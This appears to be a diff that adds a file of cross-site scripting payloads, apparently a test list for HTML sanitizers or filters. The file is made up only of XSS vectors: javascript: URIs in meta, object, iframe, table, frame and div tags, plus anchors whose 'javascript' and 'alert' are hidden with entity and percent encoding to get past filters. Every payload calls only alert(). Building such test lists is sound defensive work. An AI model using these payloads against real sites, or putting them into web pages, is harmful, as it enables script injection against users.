@@ -1,0 +1,20 @@
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(document.domain)</script>">
+
+<object data="javascript:alert(document.URL)">
+
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
+
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+
+<a href="j&amp;&num;x61vascript:%61lert(1)">click me</a>
+
+<a href="j&amp;&num;x61vascript:&#x25;61lert(2)">click me</a>
+
+<a href="j&#x61vascript://%0&#x61 &#x00025;61lert(3)">click me</a>
+
+<a href="j&#38;&#35;x61vascript&#58;&#47;&#47;&#37;0&#38;&#35;x61&#32;&#38;&#35;x00025&#59;61lert&#40;4&#41;">click me</a>
+
